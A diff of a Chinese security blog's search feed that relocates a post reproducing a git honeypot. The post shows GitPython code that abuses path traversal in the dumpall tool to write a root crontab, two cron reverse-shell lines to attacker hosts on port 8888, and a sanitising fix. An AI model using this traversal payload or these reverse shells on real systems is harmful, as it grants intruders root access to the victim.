-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
-<h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
-      </p>
-]]></content>
-      <categories>
-        <category>开源工具</category>
-      </categories>
-      <tags>
-        <tag>开源工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git 蜜罐复现</title>
-    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<blockquote>
-<p>  好久不见</p>
-</blockquote>
-<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>python3 -m pip install GitPython</code></p>
-<p>python3 运行, 生成Poc </p>
-<blockquote>
-<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
-</blockquote>
-<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
-<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
-<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
-<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
-<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
-<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
-<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
-<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
-<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
-<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
-<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
-<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
-<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
-<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>蜜罐</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>蜜罐</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows系统散列值获取</title>
     <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
     <content><![CDATA[<blockquote>
@@ -1190,6 +1136,60 @@
       <tags>
         <tag>Windows提权</tag>
         <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git 蜜罐复现</title>
+    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<blockquote>
+<p>  好久不见</p>
+</blockquote>
+<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>python3 -m pip install GitPython</code></p>
+<p>python3 运行, 生成Poc </p>
+<blockquote>
+<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
+</blockquote>
+<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
+<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
+<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
+<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
+<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
+<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
+<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
+<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
+<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
+<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
+<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
+<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
+<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>蜜罐</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>蜜罐</tag>
       </tags>
   </entry>
   <entry>
